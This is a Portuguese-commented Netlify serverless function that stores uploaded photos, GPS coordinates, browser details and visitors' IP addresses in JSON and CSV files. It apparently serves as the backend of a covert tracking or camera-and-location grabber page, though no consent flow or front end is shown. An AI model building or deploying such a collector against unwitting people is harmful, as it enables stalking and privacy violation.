const { v4: uuidv4 } = require('uuid');
const fs = require('fs');
const path = require('path');

// Pasta para salvar os arquivos (Netlify tem sistema de arquivos temporário)
const UPLOAD_DIR = '/tmp/uploads';

// Garantir que a pasta existe
if (!fs.existsSync(UPLOAD_DIR)) {
    fs.mkdirSync(UPLOAD_DIR, { recursive: true });
}

// Função principal que o Netlify vai chamar
exports.handler = async (event, context) => {
    // Apenas aceita POST
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ erro: 'Método não permitido' })
        };
    }

    try {
        const dados = JSON.parse(event.body);
        const id = uuidv4();
        const timestamp = Date.now();
        const dataHora = new Date().toISOString();

        console.log(`📥 Nova coleta - ID: ${id}`);

        let fotoSalva = false;
        let nomeFoto = null;

        // ===== SALVA A FOTO =====
        if (dados.foto && dados.foto.startsWith('data:image')) {
            try {
                const base64Data = dados.foto.replace(/^data:image\/\w+;base64,/, '');
                const extensao = dados.foto.match(/^data:image\/(\w+);base64,/)?.[1] || 'jpg';
                nomeFoto = `foto_${id}_${timestamp}.${extensao}`;
                const fotoPath = path.join(UPLOAD_DIR, nomeFoto);
                fs.writeFileSync(fotoPath, base64Data, 'base64');
                fotoSalva = true;
                console.log(`📸 Foto salva: ${nomeFoto}`);
            } catch (err) {
                console.log(`❌ Erro foto: ${err.message}`);
            }
        }

        // ===== SALVA OS DADOS EM JSON =====
        const dadosParaSalvar = {
            id,
            timestamp: dataHora,
            localizacao: dados.localizacao || null,
            navegador: dados.navegador || null,
            ip: event.headers['x-forwarded-for'] || event.headers['client-ip'] || 'IP não disponível',
            foto: fotoSalva ? nomeFoto : null
        };

        const jsonPath = path.join(UPLOAD_DIR, `dados_${id}_${timestamp}.json`);
        fs.writeFileSync(jsonPath, JSON.stringify(dadosParaSalvar, null, 2));

        // ===== SALVA NO CSV =====
        const csvPath = path.join(UPLOAD_DIR, 'todos_dados.csv');
        const csvExiste = fs.existsSync(csvPath);
        const csvLine = [
            dataHora,
            id,
            dados.localizacao?.latitude || 'N/A',
            dados.localizacao?.longitude || 'N/A',
            dados.localizacao?.precisao || 'N/A',
            dados.navegador?.userAgent || 'N/A',
            dados.navegador?.timezone || 'N/A',
            dados.navegador?.language || 'N/A',
            event.headers['x-forwarded-for'] || 'N/A',
            fotoSalva ? 'Sim' : 'Não'
        ].join(',');

        if (!csvExiste) {
            fs.writeFileSync(csvPath, 'Data,ID,Latitude,Longitude,Precisao,UserAgent,Timezone,Idioma,IP,Foto\n' + csvLine + '\n');
        } else {
            fs.appendFileSync(csvPath, csvLine + '\n');
        }

        // ===== RESPOSTA =====
        return {
            statusCode: 200,
            headers: {
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
            },
            body: JSON.stringify({
                status: 'success',
                id: id,
                fotoSalva: fotoSalva,
                timestamp: dataHora
            })
        };

    } catch (error) {
        console.error('❌ ERRO:', error);
        return {
            statusCode: 500,
            headers: {
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
            },
            body: JSON.stringify({
                status: 'error',
                mensagem: error.message
            })
        };
    }
};